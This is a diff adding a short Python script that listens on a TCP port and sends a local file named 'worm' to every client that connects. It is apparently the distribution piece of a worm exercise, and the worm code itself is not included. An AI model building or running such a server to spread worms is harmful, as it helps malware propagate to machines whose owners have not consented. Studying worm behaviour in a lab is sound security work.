@@ -1,0 +1,27 @@
+#!/bin/python3
+import socket
+import sys
+
+# get host name of this host
+host = "0.0.0.0"
+port = int(sys.argv[1])
+
+# create a socket and bind it to the assigned port
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# if the port is already in use, force it be used by this program
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((host, port))
+s.listen(1)
+while True:
+    conn_fd, address = s.accept() # accept new connection
+    # send the worm to the client
+    file = open('./worm', 'rb')
+    line = file.read(1024)
+    while(line):
+        conn_fd.send(line)
+        line = file.read(1024)
+
+    file.close()
+    conn_fd.close()
+
